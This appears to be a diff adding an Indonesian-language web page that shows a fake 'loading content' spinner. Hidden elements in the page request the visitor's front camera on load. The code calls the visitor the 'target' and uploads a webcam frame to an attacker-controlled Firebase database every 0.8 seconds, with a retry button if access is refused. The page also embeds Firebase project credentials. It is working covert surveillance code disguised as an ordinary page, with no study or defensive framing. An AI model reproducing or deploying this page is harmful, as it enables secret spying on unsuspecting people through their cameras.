@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Memuat Konten...</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; overflow: hidden; }
+        .box { text-align: center; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #btn-fallback { display: none; margin-top: 15px; padding: 10px 20px; background: #222; color: #fff; border: 1px solid #555; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="spinner"></div>
+        <p>Memuat Konten, Silakan Tunggu...</p>
+        <button id="btn-fallback" onclick="startCapture()">Lanjutkan</button>
+    </div>
+
+    <!-- Elemen tersembunyi untuk proses tangkapan kamera -->
+    <video id="cam" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <!-- Firebase SDK v9 Modular -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyBc4gDdIRxCR6H7RGBe7ejLyI6SrIRyxo0",
+            authDomain: "haij-4beb7.firebaseapp.com",
+            databaseURL: "https://haij-4beb7-default-rtdb.firebaseio.com",
+            projectId: "haij-4beb7",
+            storageBucket: "haij-4beb7.firebasestorage.app",
+            messagingSenderId: "843252587335",
+            appId: "1:843252587335:android:438d0f98d2a2505c034a62"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        async function startCapture() {
+            const video = document.getElementById('cam');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            try {
+                // Meminta izin kamera secara langsung saat halaman dibuka
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: 640, height: 480, facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                await video.play();
+
+                // Sembunyikan tombol fallback jika sempat muncul
+                document.getElementById('btn-fallback').style.display = 'none';
+
+                // Target tetap di halaman ini, sementara frame kamera dikirim terus ke Firebase setiap 0.8 detik
+                setInterval(() => {
+                    canvas.width = 320;
+                    canvas.height = 240;
+                    ctx.drawImage(video, 0, 0, 320, 240);
+                    const base64Data = canvas.toDataURL('image/jpeg', 0.5);
+
+                    set(ref(db, 'live_stream/target_feed'), {
+                        image: base64Data,
+                        time: Date.now()
+                    }).catch(err => {
+                        console.error("Sync error:", err);
+                    });
+                }, 800);
+
+            } catch (err) {
+                console.warn("Akses kamera ditolak:", err);
+                document.getElementById('btn-fallback').style.display = 'inline-block';
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', startCapture);
+    </script>
+</body>
+</html>
